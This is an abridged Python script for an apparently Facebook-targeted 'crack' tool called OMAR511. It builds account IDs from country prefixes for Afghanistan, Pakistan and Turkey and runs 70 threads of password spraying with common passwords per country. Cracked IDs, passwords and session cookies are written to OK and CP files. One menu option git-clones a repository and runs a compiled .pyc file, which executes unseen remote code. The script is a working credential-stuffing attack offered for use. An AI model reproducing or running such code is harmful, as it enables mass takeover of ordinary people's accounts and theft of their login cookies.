#---------------------[OMAR-SADAT]---------------------#
#OMAR AND SADAT IS THE BEST OF THE CRACK TOOLS SYESTUM#
...
print('\033[1;35m FOLLOW MY ON FACEBOOK..\033[1;32m')
...
\033[1;35m╔══════════════════💓(AFG)💓═══════════════════╗
║[✓]      \033[1;35mCREATED BY   :  LOY UZBEK BACHA
║[✓]      \033[1;35mSYSTEM       :  DATA & WIFI 
║[✓]      \033[1;35mFACEBOK      :  SHAHZADA QUTBUDDİN 
║[✓]      \033[1;35mGITHUB       :  UZBEK-BACHA 
║[✓]      \033[1;35mTOOLS STATUS :  FREE 
...
def barie():
    os.system('clear')
    print(logo)
    print(' \033[1;35m[1] CREATE FILE (DUMP)\33[1;37m')
    print(' \033[1;35m[2] RONDOM CLONING')
    print(' [0] (EXIT)')
    lines()
    opt = input(' \033[1;35m[+] CHOOSE OPTION:-  ')
    if opt == '2':
        riaz()
        return None
    if opt == '1':
    	os.system('rm -rf OMAR511 && git clone https://github.com/UzBek-UaCha/OMAR511 && cd OMAR511 && python HAJI-OMAR_DUMP.pyc')
...
def riaz():
	os.system('clear')
	print(logo)
	print('\033[1;35m[1] AFGHANISTAN')
	print('\033[1;35m[2] PAKISTAN')
	print('\033[1;35m[3] TURKISH')
	print('\033[1;35m[0]\x1b[1;95m EXIT ')
	lines()
	riaz1 = input('\033[1;36m[•] SELECT OPTION : ')
	if riaz1 =='1':
		annu()
	if riaz1 =='0':
		exit()
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'pakistan','ali123','123456','12345678']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b3():
    ...
    os.system('clear')
    print(logo)
    print(' EXAMPLE : 90537,90546,90553,')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'turkiye','turk123','123456','12345678']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b4():
    ...
    os.system('clear')
    print(logo)
    print(' EXAMPLE  : 90541,90554,90534,')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'123456','12345678','Ahmet1234','Ali123','mehmet123','istanbul123','izmir123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;35m[OMAR511-OK] '+uid+' | '+ps+' \n\033[1;35m COOKIE = \033[1;35m'+coki+  '  ''  \033[0;97m');print(53*'\033[1;37m═')
                open('OMAR511-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                #print('[OMAR511-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('OMAR511-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;35m[OMAR-511] %s| [OK:- %s] \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
